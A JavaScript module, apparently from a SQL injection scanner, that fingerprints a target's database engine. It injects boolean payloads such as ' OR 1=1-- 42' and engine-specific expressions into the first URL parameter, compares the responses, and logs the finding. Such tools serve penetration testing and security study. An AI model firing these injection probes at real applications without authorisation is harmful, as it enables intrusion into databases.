import { dbSaveScan, dbSaveVulnerability } from "./database.js";
import { mutateQuery, isSameRes } from "./helper.js";
import { sendRequest } from "./http.js";
import { printInfo, printSuccess } from "./logger.js";

export async function detectFingerprint(setting) {
	const query = setting.urlQuery;
	const firstParamsName = [...query.keys()][0];
	const firstParamsValue = query.get(firstParamsName);
	const c = setting.contextChar;

	// Boolean method: compare the injection of a true expression that unique to each engine vs one that all engine have
	const truePage = await sendRequest(setting, mutateQuery(query, firstParamsName, `${firstParamsValue}${c} OR 1=1-- 42`));
	const probes = [
		{ name: "MYSQL", expr: "CONNECTION_ID()=CONNECTION_ID()" },
		{ name: "POSTGRESQL", expr: "version() LIKE 'PostgreSQL%'" },
		{ name: "ORACLE", expr: "ROWNUM>=0" },
		{ name: "SQLITE", expr: "sqlite_version() LIKE '3%'" },
		{ name: "MSSQL", expr: "@@version LIKE 'Microsoft%'" },
	];

	for (const { name, expr } of probes) {
		printInfo(`Testing for engine: ${name}`);

		const payload = `${firstParamsValue}${c} OR ${expr}-- 42`;
		const params = mutateQuery(query, firstParamsName, payload);

		const res = await sendRequest(setting, params);
		if (isSameRes(truePage, res)) {
			printSuccess(`Engine Detected: ${name}`);

			const method = setting.x;
			let url = setting.urlPath.concat("?", params.toString());
			const id = dbSaveScan(setting.db, url, method, name);
			setting.scanId = id;
			dbSaveVulnerability(setting.db, id, firstParamsName, payload, "boolean");

			return name;
		}
	}
	return "UNKNOWN";
}
